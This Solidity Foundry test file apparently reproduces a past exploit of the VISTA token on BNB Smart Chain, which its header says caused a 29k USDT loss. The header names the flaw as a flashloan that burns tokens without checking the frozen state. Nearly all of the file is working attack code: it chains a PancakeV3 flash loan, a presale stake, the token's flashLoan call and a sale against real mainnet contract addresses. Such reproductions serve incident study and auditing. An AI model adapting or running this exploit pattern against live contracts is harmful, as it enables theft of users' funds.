// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// reason : flashloan will burn the token, but not check the token is freezed or not
// guy    : https://x.com/TenArmorAlert/status/1848403791881900130
// tx     : https://app.blocksec.com/explorer/tx/bsc/0x84c385aab658d86b64e132e8db0c092756d5a9331a1131bf05f8214d08efba56
// total loss : 29k USDT

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    Uni_Pair_V2 pair = Uni_Pair_V2(0x5E901164858d75852EF548B3729f44Dd93209c9c);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V3 routerV3 = Uni_Router_V3(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 HYDT = IERC20(0x9810512Be701801954449408966c630595D0cD51);
    address VISTA = 0x493361D6164093936c86Dcb35Ad03b4C0D032076;
    uint256 borrow_amount;
    address presale = 0x7C98b0cEEaFCf5b5B30871362035f728955b328c;
    address sale = 0xf738de9913bc1e21b1a985bb0E39Db75091263b7;

    function setUp() external {
        cheats.createSelectFork("bsc", 43_305_237);
        deal(address(USDT), address(this), 0);
        // deal(address(WBNB), address(this), 11 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        borrow_amount = 1500 ether;
        pool.flash(address(this), borrow_amount, 0, "");
        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        console.log("pancakeV3FlashCallback");
        // console.log(USDT.balanceOf(address(this)));
        swap_token_to_token(address(USDT), address(BUSD), USDT.balanceOf(address(this)));
        console.log(BUSD.balanceOf(address(this)));
        BUSD.approve(presale, BUSD.balanceOf(address(this)));
        (bool success,) = presale.call(
            abi.encodeWithSignature("stake(uint256,address)", BUSD.balanceOf(address(this)) / 1e18, address(this))
        );
        console.log(IERC20(VISTA).balanceOf(address(this)));
        uint256 amount = IERC20(VISTA).balanceOf(address(this));
        IERC20(VISTA).approve(address(VISTA), amount);
        (bool success1,) = VISTA.call(
            abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", address(this), VISTA, amount, "")
        );
        USDT.transfer(address(pool), borrow_amount + fee0);
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        (bool success3, bytes memory data) =
            VISTA.call(abi.encodeWithSignature("getFreeBalance(address)", address(this)));
        uint256 freeBalance = abi.decode(data, (uint256));
        IERC20(VISTA).approve(sale, type(uint256).max - 1);
        (bool success,) = sale.call(
            abi.encodeWithSignature(
                "sell(uint256,address)", freeBalance * 22_860_000_000_000_000_000 / 1e18 - 1, address(this)
            )
        );
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    receive() external payable {}
}
